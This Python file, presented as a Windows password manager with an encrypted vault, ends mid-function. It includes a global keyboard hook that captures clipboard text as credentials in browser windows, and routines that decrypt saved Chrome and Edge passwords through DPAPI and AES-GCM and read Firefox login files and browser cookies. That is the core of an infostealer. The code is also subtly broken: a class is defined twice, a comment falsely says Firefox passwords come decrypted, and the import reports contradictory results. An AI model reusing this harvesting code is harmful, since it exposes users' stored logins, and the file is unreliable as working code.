#!/usr/bin/env python3
"""
Windows Password Manager
A secure password manager for Windows with encryption and modern GUI.
"""

import os
import json
import base64
import hashlib
import secrets
import string
import sqlite3
import platform
import shutil
from datetime import datetime
import threading
import time
import re
from pathlib import Path
from urllib.parse import urlparse
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, PhotoImage

# Core security imports
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
except ImportError as e:
    messagebox.showerror("Error", "Missing cryptography module. Please install requirements.txt")
    raise SystemExit(1)

# Clipboard and input monitoring
try:
    import pyperclip
    import keyboard
except ImportError:
    messagebox.showerror("Error", "Missing pyperclip or keyboard module. Please install requirements.txt")
    raise SystemExit(1)

# Windows-specific imports
try:
    import win32gui
    import win32process
    import win32con
    import win32crypt
    from win32gui import GetWindowText, GetForegroundWindow
except ImportError:
    messagebox.showerror("Error", "Missing win32gui module. Please install pywin32")
    raise SystemExit(1)

# Optional browser integration
try:
    import keyring
    import browser_cookie3
    from Crypto.Cipher import AES
except ImportError:
    pass  # Optional features

from startup import create_startup_entry, is_startup_enabled

class ModernButton(ttk.Button):
    """Custom styled button"""
    def __init__(self, master=None, **kwargs):
        super().__init__(master, **kwargs)
        self.style = ttk.Style()
        self.style.configure('Modern.TButton',
                           background='#3498db',
                           foreground='white',
                           padding=10,
                           font=('Arial', 10))
        self.configure(style='Modern.TButton')

class ModernButton(ttk.Button):
    """Custom styled button"""
    def __init__(self, master=None, **kwargs):
        super().__init__(master, **kwargs)
        self.style = ttk.Style()
        self.style.configure('Modern.TButton',
                           background='#3498db',
                           foreground='white',
                           padding=10,
                           font=('Arial', 10))
        self.configure(style='Modern.TButton')

class ModernEntry(ttk.Entry):
    """Custom styled entry"""
    def __init__(self, master=None, **kwargs):
        super().__init__(master, **kwargs)
        self.style = ttk.Style()
        self.style.configure('Modern.TEntry',
                           fieldbackground='#ecf0f1',
                           padding=5)
        self.configure(style='Modern.TEntry')

class CredentialMonitor:
    def __init__(self, callback):
        self.callback = callback
        self.last_url = None
        self.last_window = None
        self.potential_credentials = {}
        self.monitoring = False
        self.monitor_thread = None
        self.last_input_time = time.time()
        self.input_timeout = 10  # seconds
    
    def _is_valid_window(self, hwnd):
        """Check if window handle is valid"""
        try:
            return hwnd and win32gui.IsWindow(hwnd)
        except:
            return False
    
    def _get_safe_class_name(self, hwnd):
        """Safely get window class name"""
        try:
            if self._is_valid_window(hwnd):
                return win32gui.GetClassName(hwnd).lower()
        except:
            pass
        return ""
    
    def start_monitoring(self):
        """Start monitoring for credential input"""
        if not self.monitoring:
            self.monitoring = True
            self.monitor_thread = threading.Thread(target=self._monitor_input, daemon=True)
            self.monitor_thread.start()
    
    def stop_monitoring(self):
        """Stop monitoring for credential input"""
        self.monitoring = False
        if self.monitor_thread:
            self.monitor_thread = None
    
    def _monitor_input(self):
        """Monitor for credential input"""
        def on_key_event(event):
            if not self.monitoring:
                return
            
            try:
                self.last_input_time = time.time()
                current_window = win32gui.GetForegroundWindow()
                
                if not self._is_valid_window(current_window):
                    return
                    
                window_title = win32gui.GetWindowText(current_window)
                
                # Check if it's a browser window and update URL
                if self._is_browser_window(window_title):
                    url = self._extract_url_from_title(window_title)
                    if url and url != self.last_url:
                        self.last_url = url
                        self._reset_credentials()
                    
                    # Get focused element
                    focused = win32gui.GetFocus()
                    class_name = self._get_safe_class_name(focused)
                    
                    # Try to identify input type
                    is_password = any(hint in class_name for hint in ['password', 'pwd', 'pass'])
                    is_username = any(hint in class_name for hint in ['username', 'email', 'login', 'text'])
                    
                    if event.name in ["tab", "return"] and (is_password or is_username):
                        try:
                            clipboard_text = pyperclip.paste()
                            if clipboard_text:
                                if is_password and not self.potential_credentials.get('password'):
                                    self.potential_credentials['password'] = clipboard_text
                                    if self._check_credentials():
                                        self._handle_credentials()
                                elif is_username and not self.potential_credentials.get('username'):
                                    self.potential_credentials['username'] = clipboard_text
                        except Exception as e:
                            print(f"Error accessing clipboard: {e}")
            
            except Exception as e:
                if not str(e).startswith('(1400'):  # Ignore common invalid handle errors
                    print(f"Error monitoring input: {e}")
        
        # Start keyboard monitoring
        keyboard.on_press(on_key_event)
        
        # Main monitoring loop
        while self.monitoring:
            try:
                # Check for window focus changes
                current_window = win32gui.GetForegroundWindow()
                if current_window != self.last_window and self._is_valid_window(current_window):
                    self.last_window = current_window
                    window_title = win32gui.GetWindowText(current_window)
                    
                    if self._is_browser_window(window_title):
                        url = self._extract_url_from_title(window_title)
                        if url and url != self.last_url:
                            self.last_url = url
                            self._reset_credentials()
                
                # Check for input timeout and reset if needed
                if time.time() - self.last_input_time > self.input_timeout:
                    self._reset_credentials()
                
                time.sleep(0.1)
            except Exception as e:
                if not str(e).startswith('(1400'):  # Ignore common invalid handle errors
                    print(f"Error in monitor loop: {e}")
                time.sleep(1)
    
    def _is_browser_window(self, title):
        """Check if window is a browser"""
        browsers = [
            'chrome', 'firefox', 'edge', 'safari', 'opera',
            'chromium', 'brave', 'vivaldi', 'internet explorer'
        ]
        return any(browser.lower() in title.lower() for browser in browsers)
    
    def _extract_url_from_title(self, title):
        """Extract URL from browser window title"""
        try:
            # Try different URL patterns
            patterns = [
                r'https?://[^\s/$.?#].[^\s]*',
                r'(?:https?://)?(?:www\.)?([^\s/$.?#]+\.[^\s]*)',
                r'([a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)+)'
            ]
            
            for pattern in patterns:
                match = re.search(pattern, title)
                if match:
                    url = match.group(0)
                    parsed = urlparse(url if '://' in url else f'https://{url}')
                    return parsed.netloc
            
            return None
        except Exception as e:
            print(f"Error extracting URL: {e}")
            return None
    
    def _reset_credentials(self):
        """Reset stored credentials"""
        self.potential_credentials.clear()
        self.last_input_time = time.time()
    
    def _check_credentials(self):
        """Check if credentials are complete and valid"""
        if not (self.potential_credentials.get('username') and self.potential_credentials.get('password')):
            return False
            
        # Validate credentials format
        username = self.potential_credentials['username']
        password = self.potential_credentials['password']
        
        # Basic validation
        if len(username) < 2 or len(password) < 4:
            return False
            
        # Ignore common clipboard text
        common_text = ['copy', 'paste', 'cut', 'copied', 'pasted']
        if any(text.lower() in username.lower() for text in common_text):
            return False
            
        return True
    
    def _handle_credentials(self):
        """Handle detected credentials"""
        if self.last_url and self._check_credentials():
            self.callback(
                self.last_url,
                self.potential_credentials['username'],
                self.potential_credentials['password'],
                {'source': 'live_capture', 'timestamp': datetime.now().isoformat()}
            )
            self._reset_credentials()

class BrowserCredentialManager:
    def __init__(self, callback):
        self.callback = callback
        self.browsers_config = {
            'chrome': {
                'paths': [
                    str(Path(os.environ['LOCALAPPDATA']) / 'Google/Chrome/User Data'),
                    str(Path(os.environ['LOCALAPPDATA']) / 'Google/Chrome Beta/User Data'),
                    str(Path(os.environ['LOCALAPPDATA']) / 'Google/Chrome SxS/User Data')
                ],
                'db_pattern': '**/Login Data',
                'state_pattern': '**/Local State',
                'cookies': browser_cookie3.chrome
            },
            'firefox': {
                'paths': [str(Path.home() / 'AppData/Roaming/Mozilla/Firefox/Profiles')],
                'db_pattern': '**/logins.json',
                'state_pattern': '**/key4.db',
                'cookies': browser_cookie3.firefox
            },
            'edge': {
                'paths': [str(Path(os.environ['LOCALAPPDATA']) / 'Microsoft/Edge/User Data')],
                'db_pattern': '**/Login Data',
                'state_pattern': '**/Local State',
                'cookies': browser_cookie3.edge
            }
        }
    
    def import_browser_passwords(self):
        """Import saved passwords from browsers"""
        for browser, config in self.browsers_config.items():
            try:
                for base_path in config['paths']:
                    if not os.path.exists(base_path):
                        continue
                    
                    if browser in ['chrome', 'edge']:
                        self._import_chromium_passwords(browser, base_path)
                    elif browser == 'firefox':
                        self._import_firefox_passwords(base_path)
            except Exception as e:
                print(f"Error importing from {browser}: {e}")

    def _import_chromium_passwords(self, browser, base_path):
        """Import passwords from Chromium-based browsers (Chrome/Edge)"""
        try:
            # Find all profile directories
            for profile_dir in Path(base_path).glob('**/Login Data'):
                if 'System Profile' in str(profile_dir):
                    continue

                try:
                    # Get the Local State file for the current profile
                    state_file = next(Path(profile_dir).parent.parent.glob('Local State'))
                    with open(state_file, 'r', encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                        
                    # Get the encryption key
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

                    # Copy the database to a temporary file (it may be locked)
                    temp_db = str(profile_dir) + '.tmp'
                    shutil.copy2(str(profile_dir), temp_db)

                    # Connect to the database
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins')
                    
                    for row in cursor.fetchall():
                        try:
                            url, username, encrypted_password, date_created, date_last_used = row
                            
                            # Decrypt the password
                            if encrypted_password:  # Skip empty passwords
                                try:
                                    # Try AES decryption first (newer versions)
                                    nonce = encrypted_password[3:15]
                                    cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce)
                                    password = cipher.decrypt(encrypted_password[15:-16]).decode()
                                except:
                                    # Fall back to DPAPI decryption (older versions)
                                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()

                                # Convert timestamps to readable format
                                created = datetime.fromtimestamp(date_created/1e6) if date_created else None
                                last_used = datetime.fromtimestamp(date_last_used/1e6) if date_last_used else None

                                if url and username and password:
                                    self.callback(url, username, password, {
                                        'browser': browser,
                                        'profile': str(profile_dir.parent.name),
                                        'created': created.isoformat() if created else None,
                                        'last_used': last_used.isoformat() if last_used else None
                                    })
                        except Exception as e:
                            print(f"Error decrypting credential: {e}")

                    cursor.close()
                    conn.close()
                    
                    # Clean up
                    if os.path.exists(temp_db):
                        os.remove(temp_db)

                except Exception as e:
                    print(f"Error processing profile {profile_dir}: {e}")

        except Exception as e:
            print(f"Error in Chromium import: {e}")

    def _import_firefox_passwords(self, base_path):
        """Import passwords from Firefox"""
        try:
            # Find all profile directories
            for profile_dir in Path(base_path).glob('**/logins.json'):
                try:
                    # Read logins.json
                    with open(profile_dir, 'r', encoding='utf-8') as f:
                        logins = json.loads(f.read())

                    for login in logins.get('logins', []):
                        try:
                            url = login.get('hostname')
                            username = login.get('username')
                            password = login.get('password')  # Firefox already handles decryption
                            
                            if url and username and password:
                                created = datetime.fromtimestamp(login.get('timeCreated')/1000) if login.get('timeCreated') else None
                                last_used = datetime.fromtimestamp(login.get('timeLastUsed')/1000) if login.get('timeLastUsed') else None

                                self.callback(url, username, password, {
                                    'browser': 'firefox',
                                    'profile': str(profile_dir.parent.name),
                                    'created': created.isoformat() if created else None,
                                    'last_used': last_used.isoformat() if last_used else None
                                })
                        except Exception as e:
                            print(f"Error processing Firefox credential: {e}")

                except Exception as e:
                    print(f"Error reading Firefox profile {profile_dir}: {e}")

        except Exception as e:
            print(f"Error in Firefox import: {e}")
    
class PasswordManager:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Secure Password Manager")
        self.root.geometry("800x600")
        self.root.configure(bg='#2c3e50')
        self.root.resizable(True, True)  # Allow window resizing
        
        # Configure grid weights for responsive layout
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)
        
        # Initialize database
        self.db_path = os.path.join(os.path.expanduser("~"), ".password_manager.db")
        self.master_password = None
        self.cipher_suite = None
        self.logged_in = False
        
        # Auto-logout timer
        self.last_activity = time.time()
        self.timeout_minutes = 10
        
        # Initialize monitors
        self.credential_monitor = CredentialMonitor(self.handle_detected_credentials)
        self.browser_manager = BrowserCredentialManager(self.handle_detected_credentials)
        
        self.create_database()
        self.create_widgets()
        self.start_auto_logout_timer()
    
    def create_database(self):
        """Initialize the SQLite database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS master_password (
                id INTEGER PRIMARY KEY,
                password_hash TEXT NOT NULL,
                salt TEXT NOT NULL
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS passwords (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                username TEXT,
                password TEXT NOT NULL,
                website TEXT,
                notes TEXT,
                created_date TEXT,
                modified_date TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def derive_key(self, password, salt):
        """Derive encryption key from password"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt_password(self, password):
        """Encrypt a password"""
        if not self.cipher_suite:
            return None
        return self.cipher_suite.encrypt(password.encode()).decode()
    
    def decrypt_password(self, encrypted_password):
        """Decrypt a password"""
        if not self.cipher_suite:
            return None
        try:
            return self.cipher_suite.decrypt(encrypted_password.encode()).decode()
        except:
            return None
    
    def hash_master_password(self, password, salt):
        """Hash the master password"""
        return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    
    def is_master_password_set(self):
        """Check if master password is already set"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM master_password")
        count = cursor.fetchone()[0]
        conn.close()
        return count > 0
    
    def set_master_password(self, password):
        """Set the master password"""
        salt = os.urandom(32)
        password_hash = self.hash_master_password(password, salt)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM master_password")  # Ensure only one master password
        cursor.execute("INSERT INTO master_password (password_hash, salt) VALUES (?, ?)",
                      (base64.b64encode(password_hash).decode(), base64.b64encode(salt).decode()))
        conn.commit()
        conn.close()
        
        # Set up encryption
        key = self.derive_key(password, salt)
        self.cipher_suite = Fernet(key)
        self.master_password = password
    
    def verify_master_password(self, password):
        """Verify the master password"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT password_hash, salt FROM master_password LIMIT 1")
        result = cursor.fetchone()
        conn.close()
        
        if not result:
            return False
        
        stored_hash = base64.b64decode(result[0])
        salt = base64.b64decode(result[1])
        
        password_hash = self.hash_master_password(password, salt)
        
        if password_hash == stored_hash:
            # Set up encryption
            key = self.derive_key(password, salt)
            self.cipher_suite = Fernet(key)
            self.master_password = password
            return True
        return False
    
    def generate_password(self, length=16, include_symbols=True):
        """Generate a secure random password"""
        chars = string.ascii_letters + string.digits
        if include_symbols:
            chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
        return ''.join(secrets.choice(chars) for _ in range(length))
    
    def update_activity(self):
        """Update last activity timestamp"""
        self.last_activity = time.time()
    
    def start_auto_logout_timer(self):
        """Start the auto-logout timer"""
        def check_timeout():
            while True:
                if self.logged_in and time.time() - self.last_activity > self.timeout_minutes * 60:
                    self.root.after(0, self.auto_logout)
                    break
                time.sleep(30)
        
        timer_thread = threading.Thread(target=check_timeout, daemon=True)
        timer_thread.start()
    
    def auto_logout(self):
        """Automatically logout after timeout"""
        self.logged_in = False
        self.master_password = None
        self.cipher_suite = None
        messagebox.showinfo("Auto Logout", "You have been automatically logged out due to inactivity.")
        self.show_login_screen()
    
    def create_widgets(self):
        """Create the GUI widgets"""
        self.main_frame = ttk.Frame(self.root, padding="20")
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'))
        style.configure('Heading.TLabel', font=('Arial', 12, 'bold'))
        
        # Initialize password_tree as None
        self.password_tree = None
        
        if not self.is_master_password_set():
            self.show_setup_screen()
        else:
            self.show_login_screen()
    
    def show_setup_screen(self):
        """Show the initial setup screen"""
        self.clear_main_frame()
        
        ttk.Label(self.main_frame, text="Password Manager Setup", 
                 style='Title.TLabel').pack(pady=(0, 20))
        
        ttk.Label(self.main_frame, text="Create a master password to secure your vault:").pack(pady=(0, 10))
        
        ttk.Label(self.main_frame, text="Master Password:").pack(anchor='w')
        self.master_password_var = tk.StringVar()
        password_entry = ModernEntry(self.main_frame, textvariable=self.master_password_var, 
                                  show='*', width=30)
        password_entry.pack(pady=(0, 10))
        
        ttk.Label(self.main_frame, text="Confirm Master Password:").pack(anchor='w')
        self.confirm_password_var = tk.StringVar()
        confirm_entry = ModernEntry(self.main_frame, textvariable=self.confirm_password_var, 
                                 show='*', width=30)
        confirm_entry.pack(pady=(0, 20))
        
        ModernButton(self.main_frame, text="Create Master Password", 
                  command=self.create_master_password).pack()
        
        password_entry.focus()
    
    def show_login_screen(self):
        """Show the login screen"""
        self.clear_main_frame()
        
        ttk.Label(self.main_frame, text="Password Manager Login", 
                 style='Title.TLabel').pack(pady=(0, 20))
        
        ttk.Label(self.main_frame, text="Enter your master password:").pack(pady=(0, 10))
        
        self.login_password_var = tk.StringVar()
        password_entry = ModernEntry(self.main_frame, textvariable=self.login_password_var, 
                                  show='*', width=30)
        password_entry.pack(pady=(0, 20))
        
        ModernButton(self.main_frame, text="Login", 
                  command=self.login).pack()
        
        password_entry.focus()
        password_entry.bind('<Return>', lambda e: self.login())
    
    def show_main_screen(self):
        """Show the main password manager screen"""
        self.clear_main_frame()
        
        # Header
        header_frame = ttk.Frame(self.main_frame)
        header_frame.pack(fill='x', pady=(0, 20))
        
        ttk.Label(header_frame, text="Password Manager", 
                 style='Title.TLabel').pack(side='left')
        
        # Buttons frame
        buttons_frame = ttk.Frame(header_frame)
        buttons_frame.pack(side='right')
        
        ModernButton(buttons_frame, text="Settings", 
                    command=self.show_settings).pack(side='left', padx=5)
        ModernButton(buttons_frame, text="Logout", 
                    command=self.logout).pack(side='left', padx=5)
        
        # Toolbar
        toolbar_frame = ttk.Frame(self.main_frame)
        toolbar_frame.pack(fill='x', pady=(0, 10))
        
        ModernButton(toolbar_frame, text="Add Password", 
                    command=self.add_password).pack(side='left', padx=(0, 5))
        ModernButton(toolbar_frame, text="Import Browser Passwords", 
                    command=self.import_browser_passwords).pack(side='left', padx=(0, 5))
        
        # Search bar and password list
        self.create_search_bar()
        self.create_password_list()
        self.refresh_password_list()
    
    def create_search_bar(self):
        """Create the search bar above the password list"""
        search_frame = ttk.Frame(self.main_frame)
        search_frame.pack(fill='x', pady=(0, 10))
        
        # Configure grid weights for search frame
        search_frame.grid_columnconfigure(0, weight=1)
        
        # Search entry with placeholder
        self.search_var = tk.StringVar()
        self.search_entry = ModernEntry(search_frame, textvariable=self.search_var, 
                                font=('Arial', 10))
        self.search_entry.pack(side='left', fill='x', expand=True, padx=(0, 5))
        
        # Set placeholder behavior
        def on_focus_in(event):
            if self.search_var.get() == "Search passwords...":
                self.search_var.set("")
                self.search_entry.configure(foreground='black')
        
        def on_focus_out(event):
            if not self.search_var.get():
                self.search_var.set("Search passwords...")
                self.search_entry.configure(foreground='gray')
        
        self.search_entry.bind('<FocusIn>', on_focus_in)
        self.search_entry.bind('<FocusOut>', on_focus_out)
        self.search_entry.bind('<KeyRelease>', lambda e: self.filter_passwords())
        
        # Initial placeholder
        self.search_var.set("Search passwords...")
        self.search_entry.configure(foreground='gray')
        
        # Clear search button
        ModernButton(search_frame, text="Clear", 
                    command=self.clear_search).pack(side='left')
    
    def filter_passwords(self):
        """Filter passwords based on search query"""
        query = self.search_var.get().lower()
        if query == "search passwords...":
            query = ""
        
        # Clear current list
        for item in self.password_tree.get_children():
            self.password_tree.delete(item)
        
        # Fetch and filter passwords
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT title, username, website, modified_date FROM passwords ORDER BY title")
        
        for row in cursor.fetchall():
            # Check if query matches any field
            if query in row[0].lower() or \
               query in (row[1].lower() if row[1] else "") or \
               query in (row[2].lower() if row[2] else ""):
                self.password_tree.insert('', 'end', values=row)
        
        conn.close()
    
    def clear_search(self):
        """Clear search and show all passwords"""
        self.search_var.set("Search passwords...")
        self.search_entry.configure(foreground='gray')
        self.refresh_password_list()

    def create_password_list(self):
        """Create the password list treeview"""
        list_frame = ttk.Frame(self.main_frame)
        list_frame.pack(fill='both', expand=True)
        
        # Configure grid weights for responsive layout
        list_frame.grid_columnconfigure(0, weight=1)
        list_frame.grid_rowconfigure(0, weight=1)
        
        # Create delete buttons in toolbar
        delete_frame = ttk.Frame(self.main_frame)
        delete_frame.pack(fill='x', pady=(0, 10))
        
        ModernButton(delete_frame, text="Delete Selected", 
                    command=self.delete_selected_passwords).pack(side='left', padx=(0, 5))
        ModernButton(delete_frame, text="Delete All", 
                    command=self.delete_all_passwords).pack(side='left', padx=(0, 5))
        
        self.password_tree = ttk.Treeview(list_frame, 
                                         columns=('Title', 'Username', 'Website', 'Modified'),
                                         show='headings',
                                         height=15)
        
        # Create right-click menu
        self.context_menu = tk.Menu(self.root, tearoff=0)
        self.context_menu.add_command(label="Delete", command=self.delete_selected_passwords)
        
        # Bind right-click menu
        self.password_tree.bind('<Button-3>', self.show_context_menu)
        
        self.password_tree.heading('Title', text='Title')
        self.password_tree.heading('Username', text='Username')
        self.password_tree.heading('Website', text='Website')
        self.password_tree.heading('Modified', text='Modified')
        
        self.password_tree.column('Title', width=200)
        self.password_tree.column('Username', width=150)
        self.password_tree.column('Website', width=200)
        self.password_tree.column('Modified', width=150)
        
        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', 
                                 command=self.password_tree.yview)
        self.password_tree.configure(yscrollcommand=scrollbar.set)
        
        self.password_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        self.password_tree.bind('<Double-1>', self.view_password)
        self.password_tree.bind('<Delete>', lambda e: self.delete_selected_passwords())
    
    def show_context_menu(self, event):
        """Show right-click context menu"""
        try:
            # Select the item under the cursor
            item = self.password_tree.identify_row(event.y)
            if item:
                self.password_tree.selection_set(item)
                self.context_menu.post(event.x_root, event.y_root)
        finally:
            # Remove selection after menu disappears
            self.context_menu.bind('<Leave>', lambda e: self.context_menu.unpost())
    
    def delete_selected_passwords(self):
        """Delete selected passwords from the database"""
        selected = self.password_tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Please select passwords to delete")
            return
        count = len(selected)
        if not messagebox.askyesno("Confirm Delete", 
            f"Are you sure you want to delete {count} selected password{'s' if count > 1 else ''}?"):
            return
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        for item in selected:
            values = self.password_tree.item(item)['values']
            if values:
                cursor.execute("DELETE FROM passwords WHERE title = ?", (values[0],))
        conn.commit()
        conn.close()
        self.refresh_password_list()
        messagebox.showinfo("Success", f"{count} password{'s' if count > 1 else ''} deleted successfully")
        
    def delete_all_passwords(self):
        """Delete all passwords from the database"""
        if not messagebox.askyesno("Confirm Delete All", 
            "Are you sure you want to delete ALL passwords? This cannot be undone!",
            icon='warning'):
            return
        # Double-check with a type-to-confirm dialog
        confirm = simpledialog.askstring("Confirm Delete All", 
            "Type 'DELETE' to confirm deletion of all passwords:",
            parent=self.root)
        if confirm != "DELETE":
            return
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM passwords")
        count = cursor.rowcount
        conn.commit()
        conn.close()
        self.refresh_password_list()
        messagebox.showinfo("Success", f"All passwords ({count}) have been deleted")
    
    def login(self):
        """Login with master password"""
        password = self.login_password_var.get()
        
        if not password:
            messagebox.showerror("Error", "Please enter your master password")
            return
        
        if self.verify_master_password(password):
            self.logged_in = True
            self.update_activity()
            self.credential_monitor.start_monitoring()
            self.show_main_screen()
            # Refresh the password list after the UI is set up
            self.refresh_password_list()
        else:
            messagebox.showerror("Error", "Invalid master password")
    
    def logout(self):
        """Logout and return to login screen"""
        self.logged_in = False
        self.master_password = None
        self.cipher_suite = None
        self.credential_monitor.stop_monitoring()
        self.show_login_screen()
    
    def show_settings(self):
        """Show settings dialog"""
        self.update_activity()
        dialog = tk.Toplevel(self.root)
        dialog.title("Settings")
        dialog.geometry("400x300")
        dialog.transient(self.root)
        dialog.grab_set()
        
        # Style
        style = ttk.Style()
        frame = ttk.Frame(dialog, padding="20")
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Auto-logout settings
        ttk.Label(frame, text="Auto-Logout Settings", 
                 style='Heading.TLabel').pack(pady=(0, 10))
        
        timeout_frame = ttk.Frame(frame)
        timeout_frame.pack(fill='x', pady=(0, 20))
        
        ttk.Label(timeout_frame, text="Timeout (minutes):").pack(side='left')
        timeout_var = tk.StringVar(value=str(self.timeout_minutes))
        timeout_entry = ModernEntry(timeout_frame, textvariable=timeout_var, width=10)
        timeout_entry.pack(side='left', padx=10)
        
        # Startup settings
        ttk.Label(frame, text="Startup Settings", 
                 style='Heading.TLabel').pack(pady=(0, 10))
        
        startup_var = tk.BooleanVar(value=is_startup_enabled())
        ttk.Checkbutton(frame, text="Launch at system startup", 
                       variable=startup_var).pack()
        
        def save_settings():
            try:
                # Save auto-logout timeout
                timeout = int(timeout_var.get())
                if timeout < 1:
                    raise ValueError("Timeout must be at least 1 minute")
                self.timeout_minutes = timeout
                
                # Save startup setting
                startup_enabled = startup_var.get()
                if startup_enabled:
                    create_startup_entry(enable=True)
                else:
                    # Remove startup entry if it exists
                    create_startup_entry(enable=False)
                
                messagebox.showinfo("Success", "Settings saved successfully")
                dialog.destroy()
            
            except ValueError as e:
                messagebox.showerror("Error", str(e))
        
        # Buttons
        button_frame = ttk.Frame(frame)
        button_frame.pack(side='bottom', pady=20)
        
        ModernButton(button_frame, text="Save", 
                    command=save_settings).pack(side='left', padx=5)
        ModernButton(button_frame, text="Cancel", 
                    command=dialog.destroy).pack(side='left', padx=5)
    
    def create_master_password(self):
        """Create the initial master password"""
        password = self.master_password_var.get()
        confirm = self.confirm_password_var.get()
        
        if not password:
            messagebox.showerror("Error", "Please enter a master password")
            return
        
        if len(password) < 8:
            messagebox.showerror("Error", "Master password must be at least 8 characters")
            return
        
        if password != confirm:
            messagebox.showerror("Error", "Passwords do not match")
            return
        
        self.set_master_password(password)
        self.logged_in = True
        self.update_activity()
        messagebox.showinfo("Success", "Master password created successfully!")
        self.show_main_screen()
    
    def import_browser_passwords(self):
        """Import passwords from browsers"""
        if not self.logged_in:
            messagebox.showerror("Error", "Please log in first")
            return
        
        result = messagebox.askyesno("Import Passwords", 
            "This will attempt to import saved passwords from your browsers.\n"
            "Continue?")
        
        if result:
            # Run the browser password import
            # Each found credential will be automatically saved through the callback
            try:
                self.browser_manager.import_browser_passwords()
                messagebox.showinfo("Success", "Successfully completed browser password import")
            except Exception as e:
                messagebox.showerror("Error", f"Error importing passwords: {str(e)}")
            else:
                messagebox.showinfo("Import Complete", "No passwords were found to import")
    
    def add_password(self):
        """Add a new password"""
        self.update_activity()
        dialog = tk.Toplevel(self.root)
        dialog.title("Add Password")
        dialog.geometry("400x300")
        dialog.minsize(300, 250)  # Set minimum size
        
        # Make dialog resizable and responsive
        dialog.grid_rowconfigure(0, weight=1)
        dialog.grid_columnconfigure(0, weight=1)
        
        ttk.Label(dialog, text="Title:").pack(pady=5)
        title_var = tk.StringVar()
        ModernEntry(dialog, textvariable=title_var).pack(pady=5)
        
        ttk.Label(dialog, text="Username:").pack(pady=5)
        username_var = tk.StringVar()
        ModernEntry(dialog, textvariable=username_var).pack(pady=5)
        
        ttk.Label(dialog, text="Password:").pack(pady=5)
        password_var = tk.StringVar()
        password_entry = ModernEntry(dialog, textvariable=password_var, show="*")
        password_entry.pack(pady=5)
        
        def generate():
            password = self.generate_password()
            password_var.set(password)
        
        ModernButton(dialog, text="Generate Password", command=generate).pack(pady=5)
        
        ttk.Label(dialog, text="Website:").pack(pady=5)
        website_var = tk.StringVar()
        ModernEntry(dialog, textvariable=website_var).pack(pady=5)
        
        def save():
            title = title_var.get().strip()
            username = username_var.get().strip()
            password = password_var.get()
            website = website_var.get().strip()
            
            if not title or not password:
                messagebox.showerror("Error", "Title and password are required")
                return
            
            encrypted = self.encrypt_password(password)
            if not encrypted:
                messagebox.showerror("Error", "Encryption failed")
                return
            
            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO passwords (title, username, password, website, created_date, modified_date)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (title, username, encrypted, website, now, now))
            conn.commit()
            conn.close()
            
            dialog.destroy()
            self.refresh_password_list()
            messagebox.showinfo("Success", "Password saved successfully")
        
        ModernButton(dialog, text="Save", command=save).pack(pady=20)
    
    def view_password(self, event):
        """View password details"""
        self.update_activity()
        selected = self.password_tree.selection()
        if not selected:
            return
        
        item = self.password_tree.item(selected[0])
        title = item['values'][0]
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM passwords WHERE title = ?", (title,))
        result = cursor.fetchone()
        conn.close()
        
        if result:
            dialog = tk.Toplevel(self.root)
            dialog.title("Password Details")
            dialog.geometry("400x300")
            dialog.minsize(300, 250)  # Set minimum size
            
            # Make dialog resizable and responsive
            dialog.grid_rowconfigure(0, weight=1)
            dialog.grid_columnconfigure(0, weight=1)
            
            fields = [
                ("Title", result[1]),
                ("Username", result[2]),
                ("Password", self.decrypt_password(result[3])),
                ("Website", result[4]),
                ("Created", result[6]),
                ("Modified", result[7])
            ]
            
            for label, value in fields:
                frame = ttk.Frame(dialog)
                frame.pack(fill='x', padx=20, pady=5)
                
                ttk.Label(frame, text=f"{label}:", width=10).pack(side='left')
                
                if label == "Password":
                    entry_var = tk.StringVar(value=value)
                    entry = ModernEntry(frame, textvariable=entry_var, show="*")
                    entry.pack(side='left', fill='x', expand=True, padx=(5, 0))
                    
                    def toggle_visibility():
                        # Save current state and value
                        current_show = entry.cget('show')
